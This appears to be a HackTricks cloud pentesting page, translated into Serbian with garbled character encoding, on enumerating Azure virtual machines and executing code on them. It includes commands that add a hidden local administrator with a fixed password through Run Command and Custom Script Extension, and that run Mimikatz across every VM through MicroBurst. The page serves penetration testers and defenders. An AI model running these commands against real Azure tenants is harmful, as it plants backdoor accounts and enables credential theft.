# Az - Virtuelne maÅ¡ine i mreÅ¾a

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

[Iz dokumentacije:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure virtuelne maÅ¡ine su jedan od nekoliko tipova [on-demand, skalabilnih raÄunarskih resursa](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) koje Azure nudi. ObiÄno birate virtuelnu maÅ¡inu kada vam je potrebna veÄ‡a kontrola nad raÄunarskim okruÅ¾enjem nego Å¡to druge opcije nude. Ovaj Älanak vam pruÅ¾a informacije o tome Å¡ta treba da razmotrite pre nego Å¡to kreirate virtuelnu maÅ¡inu, kako je kreirate i kako je upravljate.

## Azure mreÅ¾ne informacije

Azure mreÅ¾e sadrÅ¾e **razliÄite entitete i naÄine konfiguracije.** MoÅ¾ete pronaÄ‡i kratak **opis,** **primere** i **komande za enumeraciju** razliÄitih Azure mreÅ¾nih entiteta u:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** nudi sigurno, potpuno upravljano RDP (Remote Desktop Protocol) i SSH (Secure Shell) reÅ¡enje preko SSL-a putem Azure portala. Integriran je unutar Azure virtuelne mreÅ¾e, omoguÄ‡avajuÄ‡i RDP i SSH konektivnost ka virtuelnim maÅ¡inama koristeÄ‡i privatne IP adrese, izbegavajuÄ‡i potrebu za javnim IP adresama. Ovo ga Äini sigurnijom i praktiÄnijom alternativom tradicionalnim metodama koje ukljuÄuju dodeljivanje javnih IP adresa i konfiguracije pravila NSG-a za pristup virtuelnim maÅ¡inama. Razvojni inÅ¾enjeri i IT osoblje mogu sigurno pristupiti virtuelnim maÅ¡inama putem Azure portala koristeÄ‡i svoje web pregledaÄe, pojednostavljujuÄ‡i proces za razvojna i testna okruÅ¾enja.

Da biste izlistali sve Azure Bastion Hostove u vaÅ¡oj pretplati, moÅ¾ete koristiti sledeÄ‡u komandu:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## Enumeracija virtuelnih maÅ¡ina

### 1. Prikupljanje informacija o VM-ovima

Da biste zapoÄeli sa pentestiranjem virtuelnih maÅ¡ina (VM) u Azure cloud-u, prvo morate prikupiti informacije o dostupnim VM-ovima. Ovo moÅ¾ete uraditi na nekoliko naÄina:

#### a) Azure Portal

Pristupite Azure Portalu i prijavite se na svoj nalog. Zatim pratite ove korake:

1. Kliknite na "Virtual Machines" u meniju sa leve strane.
2. Pregledajte listu VM-ova i zabeleÅ¾ite njihova imena, IP adrese i druge relevantne informacije.

#### b) Azure CLI

Koristite Azure CLI komandu `az vm list` da biste dobili listu VM-ova. Izlaz Ä‡e sadrÅ¾ati informacije kao Å¡to su ime VM-a, IP adresa, status i druge relevantne informacije.

```plaintext
az vm list --output table
```

#### c) Azure PowerShell

Koristite Azure PowerShell komandu `Get-AzVM` da biste dobili listu VM-ova. Izlaz Ä‡e sadrÅ¾ati informacije kao Å¡to su ime VM-a, IP adresa, status i druge relevantne informacije.

```plaintext
Get-AzVM
```

### 2. Prikupljanje informacija o VM-ovima koriÅ¡Ä‡enjem API-ja

TakoÄ‘e moÅ¾ete koristiti Azure API-je da biste dobili informacije o VM-ovima. Ovo je korisno ako Å¾elite da automatizujete proces prikupljanja informacija ili integriÅ¡ete sa drugim alatima.

#### a) REST API

Koristite REST API za pristupanje informacijama o VM-ovima. Zahtev moÅ¾e izgledati ovako:

```plaintext
GET /subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Compute/virtualMachines?api-version=2020-06-01
```

#### b) Azure SDK

Koristite Azure SDK za programski pristup informacijama o VM-ovima. Primer koda u Pythonu:

```python
from azure.identity import DefaultAzureCredential
from azure.mgmt.compute import ComputeManagementClient

credential = DefaultAzureCredential()
compute_client = ComputeManagementClient(credential, subscription_id)

vms = compute_client.virtual_machines.list_all()

for vm in vms:
    print(vm.name, vm.network_profile.network_interfaces[0].id)
```

### 3. Prikupljanje informacija o VM-ovima koriÅ¡Ä‡enjem automatizovanih alata

Postoje i automatizovani alati koji mogu pomoÄ‡i u prikupljanju informacija o VM-ovima. Na primer, alat kao Å¡to je `azurerm_enum` moÅ¾e automatski prikupiti informacije o VM-ovima u Azure cloud-u.

```plaintext
azurerm_enum -t virtualmachines
```

Ovi alati mogu biti korisni za brzo prikupljanje informacija o velikom broju VM-ova.
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Pokretanje komandi na virtuelnoj maÅ¡ini**

### **AAD prijava na virtuelnoj maÅ¡ini**

MoguÄ‡e je omoguÄ‡iti pristup korisnicima koji su autentifikovani putem AzureAD-a. Na primer, pokuÅ¡avajuÄ‡i da pristupite **linux virtuelnoj maÅ¡ini**: `ssh username@azure-corp.com@1.1.1.1` (vaÅ¾no je **koristiti email** sa azurecorp koji se koristi prilikom prijave) moÅ¾ete dobiti greÅ¡ku kao Å¡to je: 

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Samo **pratite ove instrukcije** odlaskom na [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) i navoÄ‘enjem koda, koristite e-mail i lozinku kao pristupne podatke i moÄ‡i Ä‡ete se povezati putem SSH-a (ako taj korisnik ima dovoljno dozvola za to: ulogu `Virtual Machine Administrator Login` ili `Virtual Machine User Login`).

### **Pokreni naredbu**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Pokretanje proÅ¡irenja sa prilagoÄ‘enim skriptom**

ProÅ¡irenja virtuelne maÅ¡ine (VM) u Azure-u su **male aplikacije** koje omoguÄ‡avaju konfiguraciju nakon implementacije i automatizaciju **zadataka** na **Azure VM-ovima**. Na primer, ako virtuelna maÅ¡ina zahteva instalaciju softvera, antivirusnu zaÅ¡titu ili moguÄ‡nost pokretanja skripte unutar nje, moÅ¾ete koristiti VM proÅ¡irenje.

Stoga, ako imate pristup pisanju, moÅ¾ete izvrÅ¡iti proizvoljni kod:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC) je PowerShell alatka sliÄna Ansible-u, koja se koristi za podeÅ¡avanje hosta putem koda. DSC se integriÅ¡e sa Azure-om, omoguÄ‡avajuÄ‡i otpremanje odreÄ‘enih konfiguracionih fajlova. Ovi fajlovi moraju biti u skladu sa strogo definisanom sintaksom. VaÅ¾no je napomenuti da DSC ekstenzija u Azure-u moÅ¾e izvrÅ¡avati komande iz fajlova koji ispunjavaju odreÄ‘ene formatiranje kriterijume, Äak i ako sintaksa nije ispravna prema DSC standardima, kao Å¡to je prikazano na priloÅ¾enoj slici.

IzvrÅ¡avanje ovih komandi olakÅ¡ano je pomoÄ‡u funkcije [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) u Az PowerShell-u. Zahtevi ukljuÄuju **.PS1** fajl sa definisanom funkcijom i fajl mora biti zapakovan u **.zip** fajl. Iako sintaksa moÅ¾da nije taÄna za DSC, kod Ä‡e se i dalje izvrÅ¡iti. MeÄ‘utim, ekstenzija Ä‡e oznaÄiti status izvrÅ¡avanja kao "neuspeh", a nijedan izlaz iz komande neÄ‡e biti vidljiv zbog toga Å¡to je status prebrisao poruku o neuspehu.

### Definicije aplikacija za virtuelne maÅ¡ine (VM)

Definicije aplikacija za virtuelne maÅ¡ine (VM) omoguÄ‡avaju ponovljivo implementiranje verzionisanih aplikacija na Azure VM. Ovaj resurs podrÅ¾ava implementaciju i aÅ¾uriranje aplikacija na VM-ovima. Da biste to postigli, potrebno je izvrÅ¡iti nekoliko koraka, ukljuÄujuÄ‡i komande poput **`New-AzGalleryApplication`** i **`New-AzGalleryApplicationVersion`** u Az PowerShell-u.

IzvrÅ¡avanje aplikacija ili komandi putem ovog metoda ukljuÄuje **"VMAppExtension"**, koji se automatski instalira kada se aplikacija primeni na VM. Ekstenzija preuzima fajl sa odreÄ‘enog URI-ja i naziva ga taÄno kao aplikacija, bez ekstenzije. Da biste pravilno izvrÅ¡ili fajl, polje "ManageActions" u REST API pozivu mora biti konfigurisano da preimenuje fajl sa odgovarajuÄ‡om ekstenzijom. Nakon zavrÅ¡etka podeÅ¡avanja ovog metoda, struktura Ä‡e izgledati kao na priloÅ¾enoj slici.

MeÄ‘utim, ovaj metod izvrÅ¡avanja je relativno spor, potrebno je oko 3-4 minuta da se izvrÅ¡i aplikacija ili komanda. Fajlovi koji se odnose na ovaj proces Äuvaju se u odreÄ‘enim direktorijumima (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` za kopiranje aplikacije i `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` za status izvrÅ¡avanja).

Oba ova metoda pruÅ¾aju jedinstvene naÄine izvrÅ¡avanja komandi i implementacije aplikacija u Azure okruÅ¾enjima, svaki sa svojim zahtevima, koracima i razmatranjima.

### Hibridne grupe radnika (HWGs) u Azure-u

[Hibridne grupe radnika (HWGs)](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) su funkcionalnost u Azure-u koja omoguÄ‡ava izvrÅ¡avanje Runbook-ova, konfigurisanih u Automation Account-u, na Azure virtuelnoj maÅ¡ini (VM) koja je deo odreÄ‘ene HWG. Ovo izvrÅ¡avanje se olakÅ¡ava putem ekstenzije instalirane na VM-u, koja implementira kod Runbook-a na VM-u. ZnaÄajan aspekt ovog procesa je da stvarne akreditive ne utiÄu na izvrÅ¡avanje jer se kod izvrÅ¡ava sa poviÅ¡enim privilegijama, taÄnije kao **SYSTEM** ili root, kao Å¡to je prikazano na priloÅ¾enoj slici.

VaÅ¾an detalj za one koji koriste Windows 10 VM-ove je potreba da se specificira verzija PowerShell-a za Runbook. Trebalo bi da se postavi da se izvrÅ¡ava kao PowerShell verzija 5.1 umesto 7.1. Ovaj zahtev proizlazi iz Äinjenice da PowerShell 7.1 nije instaliran podrazumevano na ovim VM-ovima, Å¡to dovodi do neuspeha izvrÅ¡avanja skripta ako je specificirana verzija 7.1.

Ova funkcionalnost Azure-a pruÅ¾a robustan metod za automatizaciju i upravljanje zadacima u hibridnim okruÅ¾enjima, omoguÄ‡avajuÄ‡i centralizovano upravljanje i izvrÅ¡avanje zadataka na Azure VM-ovima.


## Reference

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
